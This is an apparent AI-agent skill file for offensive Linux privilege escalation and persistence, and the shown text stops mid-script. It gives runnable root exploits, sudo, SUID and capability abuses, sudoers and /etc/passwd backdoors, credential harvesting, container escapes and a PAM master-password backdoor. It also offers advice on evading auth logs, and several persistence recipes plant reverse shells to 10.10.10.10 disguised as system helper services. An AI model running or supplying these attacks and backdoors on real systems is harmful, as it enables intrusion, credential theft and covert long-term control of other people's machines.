---
name: privesc-linux
description: Linux privilege escalation and persistence — SUID/SGID abuse, kernel exploits, capabilities, sudo misconfig, cron jobs, writable paths, library hijacking, credential hunting, container escape, LXD/LXC, systemd timers, PAM skeleton key, polkit, MOTD, udev, git hooks, shell profile, NetworkManager, package manager hooks, at jobs, XDG autostart, LKM rootkit
metadata:
  type: offensive
  phase: post-exploitation
  tools: linpeas, pspy, gtfobins, linux-exploit-suggester, deepce, traitor
---

# Linux Privilege Escalation

## When to Activate

- Gained initial shell on Linux target, need root
- Post-exploitation privilege escalation
- Container escape scenarios
- CTF challenges requiring privesc

---

## Phase 0 — Automated Enumeration (Run First)

```bash
# LinPEAS — broadest coverage, colored output
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.out

# Traitor — finds and tries to auto-exploit common paths
curl -L https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 -o /tmp/traitor && chmod +x /tmp/traitor
/tmp/traitor -p                   # print only — don't exploit yet

# Linux Exploit Suggester 2 — kernel CVE mapping
curl -L https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl | perl

# pspy — watch process execution without root (catch cron scripts, SUID calls)
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy
/tmp/pspy -pf -i 1000             # processes + filesystem events, 1-second interval

# deepce — container-specific escape detection
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
```

---

## Phase 1 — System Context

```bash
# Identity and groups
id && whoami
groups
cat /proc/self/status | grep -i cap    # effective/permitted capabilities of current process
cat /etc/passwd | grep -v 'nologin\|false'  # interactive users
cat /etc/group | grep -v '^[^:]*:[^:]*:0:'  # non-trivial groups

# OS / kernel
uname -a
cat /etc/os-release
cat /proc/version

# Interesting env vars (tokens, creds, paths)
env | grep -iE 'pass|token|key|secret|api|aws|db|mysql|postgres'
echo $PATH | tr ':' '\n'

# Network — services running locally that aren't exposed externally
ss -tulpn
netstat -tulpn 2>/dev/null
cat /etc/hosts

# Mounted filesystems — NFS no_root_squash, FUSE, loop devices
mount | grep -v 'tmpfs\|cgroup\|proc\|sysfs\|devtmpfs'
cat /etc/fstab

# Running processes and their owners
ps auxef          # environment visible
ps aux | grep root
```

---

## Phase 2 — Sudo

```bash
sudo -l            # most important command on any Linux box

# Always check sudo version first
sudo -V | head -1
# Baron Samedit: < 1.8.27 (most distros, Jan 2021) — heap OOB
# CVE-2021-3156: sudo -s 'ANYTHING\' (trailing backslash triggers overflow)
# PoC: https://github.com/blasty/CVE-2021-3156
```

### Sudo token reuse (no password known)
```bash
# If you can ptrace another user's process that recently used sudo:
# https://github.com/nongiach/sudo_inject
# Inject sudo token into /run/sudo/ts/<user> via ptrace
# Requires: /proc/sys/kernel/yama/ptrace_scope = 0 or CAP_SYS_PTRACE
```

### env_keep LD_PRELOAD abuse
```bash
# sudoers: Defaults env_keep+=LD_PRELOAD
# Compile a malicious shared library:
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /any/allowed/command
```

### SETENV + wildcard PATH
```bash
# sudoers: (ALL) SETENV: /opt/scripts/*
# The script calls a relative binary (e.g. python, curl) without full path
sudo PATH=/tmp:$PATH /opt/scripts/whatever.sh
# Drop a malicious /tmp/python (or whatever binary the script calls)
```

### Sudo -u#-1 (CVE-2019-14287)
```bash
# Affects sudo < 1.8.28
# sudoers: (ALL,!root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash   # -1 wraps to uid 0
sudo -u#4294967295 /bin/bash
```

### Common GTFOBins sudo one-liners
```bash
# vim/vi
sudo vim -c ':!/bin/bash'

# less / more
sudo less /etc/shadow   # inside: !bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python / python3
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash"'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# lua
sudo lua -e 'os.execute("/bin/bash")'

# tcpdump — -z post-rotate exec
COMMAND='chmod +s /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF; chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

# zip
TF=$(mktemp -u); sudo zip $TF /etc/hosts -T --unzip-command="bash -c /bin/bash"

# env
sudo env /bin/bash

# tee (write to any file as root)
echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/backdoor

# node
sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# cp (overwrite /etc/passwd or /etc/cron.d/)
openssl passwd -1 -salt xyz hacked   # → $1$xyz$...
echo 'root2:$1$xyz$<HASH>:0:0:root:/root:/bin/bash' | sudo cp /dev/stdin /etc/passwd
```

---

## Phase 3 — SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null | sort   # SUID
find / -perm -2000 -type f 2>/dev/null | sort   # SGID
find / -perm /6000 -type f 2>/dev/null | sort   # both
```

### Writing a custom SUID payload (if you find writable dir + root cron copies files)
```bash
cat > /tmp/rootshell.c << 'EOF'
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
# If root sets SUID on it (e.g. deployment script):
chmod +s /tmp/rootshell
/tmp/rootshell
```

### Shared object injection via SUID binary
```bash
# Find missing shared libs in SUID binaries:
find / -perm -4000 -type f 2>/dev/null | while read f; do
  strace "$f" 2>&1 | grep -i 'No such file.*\.so'
done

# OR: ltrace/readelf
ldd /usr/bin/some_suid 2>/dev/null | grep 'not found'
readelf -d /usr/bin/some_suid | grep NEEDED

# If libsomething.so.1 is searched in a user-writable path (check RUNPATH/RPATH):
readelf -d /usr/bin/some_suid | grep -i 'rpath\|runpath'

# Compile fake library:
cat > /tmp/lib.c << 'EOF'
#include <stdlib.h>
void __attribute__((constructor)) init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -nostartfiles -o /path/to/libsomething.so.1 /tmp/lib.c
/usr/bin/some_suid   # triggers constructor → root shell
```

---

## Phase 4 — Capabilities

```bash
getcap -r / 2>/dev/null
# Also check binaries in PATH
which python3 perl ruby node | xargs getcap 2>/dev/null
```

| Capability | Abuse path |
|---|---|
| `cap_setuid+ep` | `setuid(0)` then `execve("/bin/bash")` |
| `cap_dac_read_search+ep` | read /etc/shadow, root SSH keys |
| `cap_dac_override+ep` | write any file — overwrite /etc/passwd |
| `cap_sys_admin+ep` | mount filesystems, cgroup release_agent |
| `cap_sys_ptrace+ep` | inject shellcode into root process |
| `cap_net_raw+ep` | sniff network, ARP spoof |
| `cap_fowner+ep` | chmod any file |
| `cap_chown+ep` | chown any file → chown self, then chmod +s |
| `cap_sys_module+ep` | load kernel module → rootkit |

```bash
# cap_setuid — python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search — tar, find
tar -cvf /dev/null /etc/shadow  # reads it; pipe to extract
find / -exec cat /etc/shadow \;

# cap_sys_ptrace — inject into root process
# https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject

# cap_sys_module — load LKM rootkit
# Trivial: echo a simple init_module that calls commit_creds(prepare_kernel_cred(0))
```

---

## Phase 5 — Cron Jobs

```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
crontab -l
# Other users' crontabs (as root) — check /var/spool/cron/crontabs/

# Systemd timers (often overlooked alternative to cron)
systemctl list-timers --all
find / -name '*.timer' 2>/dev/null | xargs grep -l ExecStart 2>/dev/null

# Watch what runs (pspy covers this):
/tmp/pspy64 -pf -i 500
```

### Wildcard injection
```bash
# If root cron runs: tar czf /backup/all.tar.gz /home/*   (or any command with *)
# The shell expands * — filenames become arguments
touch '/tmp/--checkpoint=1'
touch '/tmp/--checkpoint-action=exec=sh evil.sh'
cat > /tmp/evil.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /tmp/evil.sh
# When cron fires: tar treats filenames as flags → exec evil.sh
/tmp/rootbash -p

# rsync wildcard (similar):
# cron: rsync -a /opt/* root@backup:
touch 'rsync@backup:-e sh evil.sh'
```

### Writable cron script
```bash
# If a root cron calls /opt/scripts/cleanup.sh and it's world-writable:
echo 'chmod +s /bin/bash' >> /opt/scripts/cleanup.sh
# Wait for cron, then: bash -p
```

### Writable cron.d directory
```bash
# Create new cron entry:
echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/backdoor
```

---

## Phase 6 — Writable Files & PATH Hijacking

```bash
# Interesting writable files (exclude /proc /sys /dev /run)
find / -writable -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' \
       -not -path '/run/*' -type f 2>/dev/null

# Writable directories in root's PATH
for p in $(sudo -V 2>/dev/null | grep 'env_keep' | tr ' ' '\n'); do echo $p; done
# Or just check system-wide PATH additions:
cat /etc/environment /etc/profile /etc/profile.d/*.sh 2>/dev/null | grep PATH
```

### /etc/passwd writable
```bash
openssl passwd -1 -salt hax P@ssw0rd    # generates hash
echo 'hax:$1$hax$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax   # password: P@ssw0rd
```

### /etc/shadow readable (rare, misconfigured group)
```bash
ls -la /etc/shadow
# If readable: copy hashes and crack with hashcat -m 1800 (sha512crypt)
hashcat -m 1800 shadow.txt rockyou.txt
```

### Writable systemd service/timer
```bash
find /etc/systemd /usr/lib/systemd -writable -type f 2>/dev/null
# Modify ExecStart= to point to a reverse shell or chmod +s /bin/bash
systemctl daemon-reload
systemctl restart <service>
```

### Writable /etc/ld.so.conf.d/ (library path injection)
```bash
ls -la /etc/ld.so.conf.d/
# If writable: add a dir you control → place malicious .so → ldconfig caches it
echo '/tmp/libs' >> /etc/ld.so.conf.d/custom.conf
ldconfig   # requires root — but check if logrotate or other tool calls it
```

### PATH hijacking (no SUID needed — just a root script calling relative binaries)
```bash
# Find scripts run as root that call commands without absolute paths
strings /usr/local/bin/root_script | grep -v '/'   # relative calls

# Create hijack binary:
cat > /tmp/curl << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/curl
export PATH=/tmp:$PATH
# Trigger the script (via sudo, cron, or service restart)
bash -p
```

---

## Phase 7 — Library Hijacking

### LD_PRELOAD (unprivileged, for binaries we can control)
```bash
# Works when: process sets LD_PRELOAD to user-controlled path,
# OR binary is non-SUID and we control LD_PRELOAD in environment
cat > /tmp/hook.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
int puts(const char *s) {   // hook any function the target calls
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
LD_PRELOAD=/tmp/hook.so /usr/local/bin/some_root_binary
```

### RPATH / RUNPATH writable directory
```bash
# Binary compiled with insecure RPATH pointing to user-writable dir:
readelf -d /usr/bin/target | grep -i 'rpath\|runpath'
# If RPATH=/opt/lib and /opt/lib is writable:
cp /tmp/hook.so /opt/lib/libany.so.1
/usr/bin/target   # loads our lib first
```

### ldconfig.so.conf injection (requires triggering ldconfig)
```bash
# If /etc/ld.so.conf.d/<file> is writable, or a directory it points to:
echo '/tmp' > /etc/ld.so.conf.d/inject.conf
ldconfig 2>/dev/null || true
# Place lib in /tmp with same name as a lib used by SUID binary
```

---

## Phase 8 — Credential Hunting

```bash
# Shell history (often contains passwords entered interactively)
cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null
find / -name '.*_history' 2>/dev/null | xargs cat 2>/dev/null

# Config files with embedded credentials
grep -rniE 'password|passwd|pass=|pwd=|secret|api_key|token|credential' \
     /etc /home /opt /var/www /var/lib /root 2>/dev/null \
     --include='*.conf' --include='*.cfg' --include='*.ini' \
     --include='*.yml' --include='*.yaml' --include='*.env' \
     --include='*.php' --include='*.py' --include='*.rb' \
     --include='*.sh' --include='*.js' -l | head -30

# .env files
find / -name '.env' -not -path '*/node_modules/*' 2>/dev/null | xargs cat 2>/dev/null

# Private SSH keys (world-readable)
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
find / -perm /o+r -name 'id_*' 2>/dev/null

# authorized_keys → enumerate login targets
find / -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null

# MySQL / PostgreSQL credentials
cat /etc/mysql/debian.cnf 2>/dev/null       # Debian maintenance creds (often root!)
find / -name 'my.cnf' -o -name '.my.cnf' 2>/dev/null | xargs grep -i password 2>/dev/null
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null

# WordPress / web app configs
find / -name 'wp-config.php' 2>/dev/null | xargs grep -E 'DB_PASSWORD|DB_USER' 2>/dev/null
find / -name 'settings.py' 2>/dev/null | xargs grep -i password 2>/dev/null
find / -name 'database.yml' 2>/dev/null | xargs cat 2>/dev/null

# Backup files
find / -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*.orig' 2>/dev/null
find / -name 'shadow.bak' -o -name 'passwd.bak' 2>/dev/null

# Readable /root directory
ls -la /root 2>/dev/null
ls -la /root/.ssh 2>/dev/null

# Credential files stored by tools
find / -name 'credentials' -o -name '.credentials' 2>/dev/null
cat /home/*/.aws/credentials 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null
```

---

## Phase 9 — Kernel Exploits

```bash
uname -r
cat /proc/version
searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"
```

| CVE | Name | Kernels affected | Notes |
|---|---|---|---|
| CVE-2026-31431 | copy.fail | 2017–2026-04-01 (all mainstream distros) | AF_ALG + splice page-cache write; 100% reliable, no race, Python 3.10+ PoC |
| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 | Overwrite read-only files via pipe; trivial PoC |
| CVE-2021-4034 | PwnKit | All; pkexec < 0.105 | polkit pkexec universal LPE |
| CVE-2021-33909 | Sequoia | 3.16 – 5.13.3 | seq_file write in mountinfo |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | heap OOB in sudoedit |
| CVE-2023-2640 | GameOver(lay) | Ubuntu 22.04 < 6.2.0-1011 | OverlayFS setxattr |
| CVE-2023-32629 | GameOver(lay) | Ubuntu 20.04 < 5.4.0-155 | OverlayFS companion |
| CVE-2016-5195 | DirtyCow | 2.6.22 – 4.8.3 | COW race on read-only mmap |
| CVE-2022-2588 | route4_change | 5.4 – 5.19.6 | net/sched UAF |
| CVE-2023-0386 | OverlayFS fscaps | 5.11 – 6.2 | copy_tree with SXID |

```bash
# DirtyPipe (CVE-2022-0847) — overwrite SUID binary or /etc/passwd
# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc -o /tmp/dirtypipe exploit.c && /tmp/dirtypipe /etc/passwd   # replaces root entry

# PwnKit (CVE-2021-4034)
git clone https://github.com/ly4k/PwnKit && cd PwnKit && make && ./PwnKit

# GameOver(lay) — check if Ubuntu kernel is vulnerable
uname -r | grep -qE '^(5\.4\.[0-9]|5\.15\.|6\.2\.)' && echo "potentially vulnerable"
# PoC: https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

# Baron Samedit — heap overflow in sudo argument parsing
# PoC: https://github.com/blasty/CVE-2021-3156
```

### CVE-2026-31431 — copy.fail (AF_ALG + splice page-cache write)

**Root cause:** Straight-line logic bug in `authencesn` chained through `AF_ALG` (kernel crypto API) and `splice()` into a 4-byte page-cache write. A 2017 optimization in `algif_aead` allowed page-cache pages to end up in writable destination scatterlists — this was never corrected until the patch.

**Impact:** Any unprivileged local user → root. Also works as a container escape primitive. No race condition, no kernel KASLR offsets needed — 100% reliable across distros.

**Affected:** All mainstream Linux distributions shipping kernels built between 2017 and the upstream patch (committed 2026-04-01, disclosed 2026-04-29). The `AF_ALG` interface is enabled by default everywhere.

| Distribution | Affected kernel (confirmed) | Status |
|---|---|---|
| Ubuntu 24.04 LTS | 6.17.0-1007-aws | Patched — update kernel |
| Amazon Linux 2023 | 6.18.8-9.213.amzn2023 | Patched — update kernel |
| RHEL 10.1 | 6.12.0-124.45.1.el10_1 | Patched — update kernel |
| SUSE 16 | 6.12.0-160000.9-default | Patched — update kernel |
| Debian, Arch, Fedora, Rocky, Alma, Oracle | All kernels 2017–patch date | Patched in most — verify |

**Timeline:**
- 2017 — vulnerable optimization introduced in `algif_aead`
- 2026-03-23 — reported to kernel security team
- 2026-04-01 — patch committed to mainline (`a664bf3d603d`)
- 2026-04-29 — public disclosure + PoC release

**Prerequisites:**
- Unprivileged local user account
- `AF_ALG` kernel module loaded (default on all mainstream distros)
- Python 3.10+

```bash
# Check if target is vulnerable
python3 --version                       # need 3.10+
cat /proc/crypto | grep authencesn      # module present = likely vulnerable
grep -r algif_aead /proc/modules 2>/dev/null || lsmod | grep algif_aead

# Exploit — targets /usr/bin/su by default
curl https://copy.fail/exp | python3 && su
# → root shell

# Pass alternative SUID binary as argument if su is hardened:
curl -s https://copy.fail/exp | python3 - /usr/bin/passwd
curl -s https://copy.fail/exp | python3 - /usr/bin/newgrp

# Offline: download PoC, inspect, then run
curl -s https://copy.fail/exp -o /tmp/copyfail.py
# Review 732-byte script before executing
python3 /tmp/copyfail.py
```

**Patch check (verify target is patched):**
```bash
# Check for mainline commit a664bf3d603d in running kernel
grep -r 'a664bf3d' /proc/config.gz 2>/dev/null || true
# More reliable: check kernel version against distro advisory
# Ubuntu: >= 6.17.0-1008 / Amazon Linux: >= 6.18.8-9.214 / RHEL >= patched advisory

# Temporary mitigation if you can't update:
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null
```

**OPSEC:** Page-cache modification is in-memory only — non-persistent across reboot. The `AF_ALG` socket call that triggers the bug does not appear in typical audit rules. Python invocation of `su` will land in auth logs (wtmp/btmp) under the original user — consider using `newgrp` or `passwd` as the target SUID binary if you want to avoid a `su` auth log entry.

---

## Phase 10 — Container Escape

### Detection
```bash
cat /proc/1/cgroup | grep -i 'docker\|lxc\|container'
ls -la /.dockerenv 2>/dev/null
systemd-detect-virt 2>/dev/null
grep -i container /proc/1/environ 2>/dev/null | tr '\0' '\n'
capsh --print 2>/dev/null | grep 'cap_sys_admin'
```

### Docker socket mounted
```bash
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it --privileged alpine chroot /host /bin/bash
# If docker binary not present:
curl -fsSL https://download.docker.com/linux/static/stable/x86_64/docker-24.0.0.tgz | tar xz
./docker/docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

### Privileged container
```bash
fdisk -l   # can see host disks if privileged
# Mount host root:
mkdir /tmp/hostfs && mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs /bin/bash

# Alternatively — cgroup release_agent escape (no disk access needed):
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/rootbash -p
```

### LXD/LXC escape (user in lxd group)
```bash
id | grep lxd    # user must be in lxd group
# Method 1 — init LXD with Alpine image
lxd init --auto
lxc image import /tmp/alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer -- /bin/sh
# Inside container: ls /mnt/root — you see host filesystem as root
chroot /mnt/root /bin/bash

# Build Alpine image offline:
# https://github.com/saghul/lxd-alpine-builder → ./build-alpine
```

### CVE-2019-5736 (runc overwrite)
```bash
# Exploit: overwrite /usr/bin/runc on host via /proc/self/exe during exec
# Requires: triggering docker exec or docker run from the host on the container
# PoC: https://github.com/Frichetten/CVE-2019-5736-PoC
```

---

## Phase 11 — Polkit / D-Bus

```bash
# Check pkexec version
pkexec --version
# < 0.105 → CVE-2021-4034 PwnKit (see kernel exploits section)

# Polkit rules (check for misconfigured rules allowing unprivileged actions)
ls /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/
# Rules with: return polkit.Result.YES (no auth)

# D-Bus enumeration
gdbus introspect --system --dest org.freedesktop.PolicyKit1 \
      --object-path /org/freedesktop/PolicyKit1/Authority
# List all D-Bus services:
busctl list 2>/dev/null | grep -v '^:'
# Introspect a service for callable methods:
gdbus introspect --system --dest <service.name> --object-path /path/to/obj
```

---

## Phase 12 — Interesting Services / Network

```bash
# Services listening only on loopback (internal-only admin panels, APIs)
ss -tulpn | grep '127\.'
# Port forward to reach them from attacking machine:
ssh -L 8080:127.0.0.1:8080 user@target
# Or: use chisel/ligolo for client-side

# Check for MySQL root with empty password
mysql -u root -e "SELECT user, host, authentication_string FROM mysql.user;" 2>/dev/null
mysql -u root --password='' -e "SHOW GRANTS;" 2>/dev/null

# PostgreSQL peer auth (run as postgres OS user)
sudo -u postgres psql -c "\du"
# If current user can become postgres via service misconfig:
sudo -u postgres psql -c "CREATE USER hax SUPERUSER PASSWORD 'pass';"

# Redis (often no auth)
redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys
redis-cli -h 127.0.0.1 SET key "\n\nssh-rsa AAAA...your-pubkey...\n\n"
redis-cli -h 127.0.0.1 BGSAVE
```

---

## Phase 13 — NFS no_root_squash

```bash
# From attacking machine or inside target with NFS tools
showmount -e $TARGET
cat /etc/exports   # on target, check no_root_squash / no_all_squash

# If /share is exported with no_root_squash:
# (On attacking machine as root)
mount -t nfs $TARGET:/share /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
umount /mnt/nfs
# (On target as low-priv)
/tmp/nfs/rootbash -p
```

---

## Phase 14 — PAM Backdoor (Post-Exploitation Persistence)

```bash
# If you have root momentarily and want PAM backdoor:
# Edit /etc/pam.d/common-auth (or /etc/pam.d/sshd) to add:
auth sufficient pam_exec.so quiet expose_authtok /tmp/backdoor.sh
# /tmp/backdoor.sh logs passwords or grants access on magic passphrase

# Magic password PAM module:
# https://github.com/zephrax/linux-pam-backdoor
# Compiles pam_unix.so with a hardcoded master password that works for any user
```

---

## Phase 15 — Logrotate Exploitation

```bash
# Vulnerability: logrotate runs as root, calls postrotate scripts in writable dirs
# Or: world-writable log file + logrotate runs as root → race condition (logrotten)
# https://github.com/whotwagner/logrotten

# Check logrotate configs for writable script paths:
grep -r 'postrotate\|prerotate\|firstaction\|lastaction' /etc/logrotate.d/ 2>/dev/null
ls -la $(grep -r 'postrotate' /etc/logrotate.d/ 2>/dev/null | awk '{print $NF}' | grep -v '^$')

# logrotten exploit:
# 1. Target: log file that logrotate processes, owned by us or world-writable
# 2. Run: ./logrotten -p /tmp/pay.sh /path/to/logfile.log
# 3. /tmp/pay.sh = reverse shell / chmod +s /bin/bash
```

---

## Phase 16 — Screen / Tmux Session Hijacking

```bash
# List other users' screen sessions (may be root sessions)
ls -la /var/run/screen/S-root/
screen -ls
# Attach to root screen session (if socket world-readable — misconfigured):
screen -x root/<session>

# Tmux sessions owned by root:
ls -la /tmp/tmux-0/
tmux -S /tmp/tmux-0/default attach
```

---

## Phase 17 — Abusing Special Groups

```bash
# Find which non-standard groups current user is in:
id

# Common escalation groups:
# disk     → direct read of block device (raw /etc/shadow)
# shadow   → read /etc/shadow directly
# docker   → docker socket → host root (see container escape)
# lxd      → lxd container escape (see container escape)
# adm      → read /var/log/* (credential mining)
# sudo     → sudo privileges
# video    → read /dev/fb0 framebuffer (screenshot)
```

```bash
# disk group → raw block device reads
df -h   # find root partition device
debugfs /dev/sda1   # interactive filesystem browser as any user
# Inside debugfs: cat /etc/shadow

# shadow group
cat /etc/shadow   # direct read

# adm group — mine logs for credentials
grep -irE 'password|passwd' /var/log/ 2>/dev/null | grep -v 'Binary'
zgrep -irE 'password|passwd' /var/log/*.gz 2>/dev/null
```

---

## Phase 18 — Automated Exploitation (Traitor / GTFOBins Auto)

```bash
# Traitor — tries to auto-exploit common vectors
# -p = print only; remove -p to attempt exploitation
/tmp/traitor -p

# manual GTFOBins lookups by capability:
# https://gtfobins.github.io/#+sudo
# https://gtfobins.github.io/#+suid
# https://gtfobins.github.io/#+capabilities
```

---

## Quick Reference — Decision Tree

```
Got shell → run id, sudo -l, uname -a

sudo -l shows anything?
  → check GTFOBins / LD_PRELOAD / SETENV abuse → done

SUID binaries unusual?
  → check GTFOBins → check for missing .so injection → done

Capabilities set?
  → cap_setuid / cap_dac_read_search / cap_sys_admin → done

Cron jobs writable?
  → modify script or inject wildcard → done

Writable /etc/passwd?
  → add root-level user → done

In container?
  → docker.sock / privileged / lxd group → done

Interesting services on loopback?
  → mysql/redis with no auth → credential harvest → done

Kernel version?
  → DirtyPipe / PwnKit / GameOver(lay) → compile PoC → done

Credentials in configs / history?
  → try su/sudo with found creds → done
```

---

# Linux Persistence Techniques

> All commands below are standalone — no PANIX binary required. Each section
> is one atomic technique you can run manually, one at a time.
> Reference: https://github.com/Aegrah/PANIX (PANIX automates these; this skill gives you the raw primitives.)

---

## Persist-01 — Shell Profile (.bashrc / .profile / /etc/profile.d)

```bash
RHOST=10.10.10.10; RPORT=4444

# Per-user (survives login, not reboot)
echo "nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &" >> ~/.bashrc
echo "nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &" >> ~/.bash_profile
echo "nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &" >> ~/.zshrc

# System-wide — triggers on every interactive login (root required)
cat > /etc/profile.d/99-update.sh << EOF
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
EOF
chmod +x /etc/profile.d/99-update.sh
```

**OPSEC note:** `.bashrc` only fires on interactive non-login shells (SSH PTY, su). `.bash_profile` fires on SSH login. `/etc/profile.d/` fires on all login shells but is visible to any user doing `ls /etc/profile.d/`.

---

## Persist-02 — Systemd Service (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

cat > /etc/systemd/system/systemd-logind-helper.service << EOF
[Unit]
Description=Login Session Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now systemd-logind-helper.service
```

---

## Persist-03 — Systemd Generator (root required)

```bash
# Generators run before unit files at boot — stealthier than a service
# Directories: /usr/lib/systemd/system-generators/ or /etc/systemd/system-generators/
RHOST=10.10.10.10; RPORT=4444

cat > /etc/systemd/system-generators/systemd-network-helper << 'EOF'
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/RHOST/RPORT 0>&1' &
exit 0
EOF
sed -i "s/RHOST/$RHOST/; s/RPORT/$RPORT/" /etc/systemd/system-generators/systemd-network-helper
chmod +x /etc/systemd/system-generators/systemd-network-helper
# Fires on every systemctl daemon-reload and boot
```

---

## Persist-04 — rc.local (root required, older distros)

```bash
RHOST=10.10.10.10; RPORT=4444

# Ensure rc.local exists and is executable
[ -f /etc/rc.local ] || echo '#!/bin/bash' > /etc/rc.local
chmod +x /etc/rc.local

# Inject before final 'exit 0'
sed -i "/^exit 0/i nohup bash -c 'bash -i >& /dev/tcp\/$RHOST\/$RPORT 0>&1' &" /etc/rc.local

# Enable service (systemd systems)
systemctl enable rc-local 2>/dev/null || true
```

---

## Persist-05 — SysVinit /etc/init.d (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

cat > /etc/init.d/network-helper << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          network-helper
# Required-Start:    \$network
# Required-Stop:     \$network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Network Helper Service
### END INIT INFO
case "\$1" in
  start) nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' & ;;
  stop|status) ;;
esac
EOF
chmod +x /etc/init.d/network-helper
update-rc.d network-helper defaults 2>/dev/null || chkconfig --add network-helper 2>/dev/null
```

---

## Persist-06 — MOTD (Debian/Ubuntu only — not RHEL/CentOS)

```bash
RHOST=10.10.10.10; RPORT=4444

# Files in /etc/update-motd.d/ run as root on every SSH login
cat > /etc/update-motd.d/99-sysinfo << EOF
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1' &
EOF
chmod +x /etc/update-motd.d/99-sysinfo

# Verify it's enabled:
grep -r 'update-motd' /etc/ssh/sshd_config /etc/pam.d/sshd 2>/dev/null
# Look for: PrintMotd yes (sshd_config) or pam_motd.so (pam.d)
```

---

## Persist-07 — Udev Rules (root required)

```bash
RHOST=10.10.10.10; RPORT=4444

# Trigger on any network interface coming up (excludes loopback)
cat > /etc/udev/rules.d/99-net-helper.rules << EOF
SUBSYSTEM=="net", ACTION=="add", KERNEL!="lo", RUN+="/usr/lib/udev/net-setup"
EOF

cat > /usr/lib/udev/net-setup << EOF
#!/bin/bash
